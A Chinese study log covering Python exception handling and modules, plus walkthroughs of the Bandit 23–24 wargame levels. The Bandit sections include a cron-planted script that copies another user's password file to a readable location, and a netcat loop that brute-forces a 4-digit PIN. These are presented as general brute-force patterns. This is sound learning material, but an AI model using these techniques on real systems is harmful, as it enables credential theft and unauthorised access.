# 2026-11-12　Python 异常处理 + 模块 + Bandit 23–24

> 记录方法，不记录密码。

---

## 一、Python：异常处理

### 为什么需要

```python
x = int(input("输入数字："))
```

用户输入 `abc`，程序直接崩：

```
ValueError: invalid literal for int() with base 10: 'abc'
```

异常处理让程序**出错时不崩溃，而是走另一条路**。

### 基本结构

```python
try:
    x = int(input("输入一个数："))
except ValueError:
    print("这不是数字")
else:
    print(f"你输入了 {x}")
finally:
    print("无论如何都会执行")
```

| 关键字 | 执行时机 |
|---|---|
| `try` | 尝试执行，出错跳到 except |
| `except 类型` | 捕获到指定异常时执行 |
| `else` | try 里**没出错**时执行 |
| `finally` | **总会执行**，不管有没有错 |

### 常见异常类型

| 异常 | 触发条件 | 例子 |
|---|---|---|
| `ValueError` | 类型对、值不对 | `int("abc")` |
| `TypeError` | 类型不对 | `"a" + 1` |
| `FileNotFoundError` | 文件不存在 | `open("没有.txt")` |
| `KeyError` | 字典没这个键 | `d["不存在"]` |
| `IndexError` | 下标越界 | `nums[99]` |
| `ZeroDivisionError` | 除以 0 | `1 / 0` |
| `PermissionError` | 没权限 | `open("/root/x")` |

### 捕获多个异常

```python
try:
    with open("data.txt") as f:
        nums = [int(x) for x in f.read().split()]
    avg = sum(nums) / len(nums)
except FileNotFoundError:
    print("文件不存在")
except ValueError:
    print("文件里有非数字")
except ZeroDivisionError:
    print("文件是空的")
```

**从上往下匹配，命中一个就跳出。** 所以具体的异常写在前面，宽泛的写在后面。

### 今天的完整代码

```python
def wc(path):
    with open(path) as f:
        text = f.read()
    return len(text.splitlines()), len(text.split()), len(text)


try:
    lines, words, chars = wc("text.txt")
    print(f"行: {lines}, 词: {words}, 字符: {chars}")
except FileNotFoundError:
    print("没有找到文件")
finally:
    print("总要输出点什么")
```

### 一个关键认知：try 包住的是“调用”，不是“定义”

错误写法：

```python
try:
    def wc(path):        # 这里只是定义，不会读文件
        with open(path) as f:
            ...
except FileNotFoundError:
    print("没找到")
```

`def` 不执行任何操作，只是把函数登记下来。**真正的执行在调用时**，而调用在 try 外面，异常不会被捕获。

正确：

```python
def wc(path):            # 定义放外面
    ...

try:
    wc("text.txt")       # 调用放 try 里
except FileNotFoundError:
    ...
```

**口诀：def 不干活，调用才干活。**

### 测试异常的正确方式

第一次测试时，代码和文件名同时改成了 `text2.txt`，两边一致，根本不会触发异常——**以为测过了，其实 except 分支一次都没执行**。

要测异常，必须让错误**真的发生**：

- 代码写 `wc("text.txt")`
- 文件叫 `text2.txt`
- 两边不一致 → 触发 `FileNotFoundError`

**原则：要验证错误处理，先制造一次真错误。**

---

## 二、Python：模块

### 使用内置模块

```python
import math
print(math.sqrt(16))     # 4.0
print(math.pi)           # 3.14159...

from random import randint
print(randint(1, 10))    # 1-10 随机整数

import os
print(os.listdir("."))   # 当前目录的文件列表
print(os.getcwd())       # 当前工作目录
```

### 两种导入方式

```python
import math
math.sqrt(16)            # 要带模块名前缀

from math import sqrt
sqrt(16)                 # 直接用
```

**推荐第一种**：`math.sqrt` 一眼能看出这函数从哪来。第二种容易和本地变量名冲突。

### 自己写模块

新建 `mytools.py`：

```python
def add(a, b):
    return a + b
```

另一个文件：

```python
import mytools
print(mytools.add(1, 2))    # 3
```

**模块就是一个 .py 文件**，放在同一目录下就能被 import。

> 这是把代码拆开、复用的起点。以后写工具，`utils.py`、`scan.py` 之类就是模块。

---

## 三、Bandit 23：cron 投放脚本

### 现场

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```

脚本大意：

```bash
#!/bin/bash
for file in /var/spool/bandit24/foo/*; do
    if [ -f "$file" ]; then
        bash "$file"
        rm "$file"
    fi
done
```

**每分钟，以 bandit24 的身份，执行 `/var/spool/bandit24/foo/` 下的所有文件。**

### 做法

```bash
cd /var/spool/bandit24/foo

cat > myscript.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/p24
chmod 644 /tmp/p24
EOF

chmod 755 myscript.sh
```

等一分钟，然后：

```bash
cat /tmp/p24
```

### 三个细节

**1. `<< 'EOF'` 是 here-document**

```bash
cat > 文件 << 'EOF'
多行内容
EOF
```

把 `EOF` 之间的内容原样写进文件。**加引号 `'EOF'` 很重要**：不加引号，`$变量` 会被提前展开；加了引号，内容原样保留。

**2. 为什么必须 `chmod 644`**

脚本以 **bandit24** 身份运行，所以 `/tmp/p24` 的属主是 bandit24。

默认权限受 `umask` 影响，可能是 600。如果是 600，**只有 bandit24 能读**，你（bandit23）读不了。

`644` = `rw-r--r--`：
- 属主 bandit24：读写
- 组：读
- **其他人：读** ← 你能读靠的就是这个

**3. 为什么脚本要 `chmod 755`**

755 = `rwxr-xr-x`，让脚本有**执行权限**。没有执行权限，`bash "$file"` 也许还能跑，但规范做法是给执行权。

### 权限模型要点

不是“最高权限”“最低权限”的等级关系，而是：

> **每个用户对每个文件，分别有三个身份（属主/组/其他人），各有一组权限。**

bandit23 和 bandit24 地位平等，只是各自只写得了自己的文件。

---

## 四、Bandit 24：暴力破解

### 目标

服务在 `localhost:30002`，需要提交：

```
<当前密码> <4位PIN>
```

PIN 范围 `0000`–`9999`，共 10000 种。

### 脚本

```bash
P=$(cat /etc/bandit_pass/bandit24)

for i in $(seq -w 0000 9999); do
    echo "$P $i"
done | nc localhost 30002 > /tmp/result.txt

grep -A 2 -i "correct" /tmp/result.txt
```

### 拆解

| 部分 | 作用 |
|---|---|
| `P=$(...)` | 把密码存进变量，只读一次 |
| `seq -w 0000 9999` | 生成 0000 到 9999，`-w` 补零对齐 |
| `echo "$P $i"` | 每个 PIN 一行 |
| `\| nc localhost 30002` | 全部发给服务端 |
| `> /tmp/result.txt` | 结果存文件，别刷屏 |
| `grep -A 2` | 匹配行 + 后 2 行 |

### 爆破的基本结构

任何爆破都是这三步：

```
1. 生成候选列表（字典）
2. 批量发送 / 逐个尝试
3. 过滤出成功的那一个
```

```bash
生成 | 发送 | 过滤
```

**这个三段式，以后做登录爆破、目录扫描、子域名枚举，结构完全一样。**

### 效率和限制

- 10000 次能跑完，但真实场景往往有**速率限制、锁定策略、验证码**
- 所以现实中的爆破，重点不在“跑得快”，而在“**找到有效的候选列表**”
- 这也是为什么弱口令字典（rockyou.txt）是安全领域的核心资产之一

---

## 五、踩坑记录

| 错误 | 原因 | 正确 |
|---|---|---|
| `try` 包住 `def`，异常没被捕获 | `def` 不执行，调用才执行 | try 包住调用 |
| 改代码和文件名改成一致，没触发异常 | 两边都改了，还是能找到 | 只改一边，制造真错误 |
| 脚本没 `chmod 644` | 文件权限 600，别人读不了 | 显式设 644 |
| 理解成“bandit24 是最高权限” | 权限是三维模型，不是等级 | 属主/组/其他人分别看 |

---

## 六、自测

1. `try/except/else/finally` 四个块分别在什么时候执行？
2. 为什么 `try` 里放函数定义是没用的？
3. 怎么才能确定 `except` 分支真的能工作？
4. `import math` 和 `from math import sqrt` 有什么区别？推荐哪个？
5. here-document 的 `'EOF'` 加引号和不加引号，差别在哪？
6. 脚本以 bandit24 身份运行，写出的文件属主是谁？为什么需要 `chmod 644`？
7. 爆破的三段式是哪三步？

---

## 七、明天

- Python：`os` / `sys` / `subprocess` 模块
- Bandit 25–26（受限 shell 逃逸）
- 开始写第一个真正的安全小工具
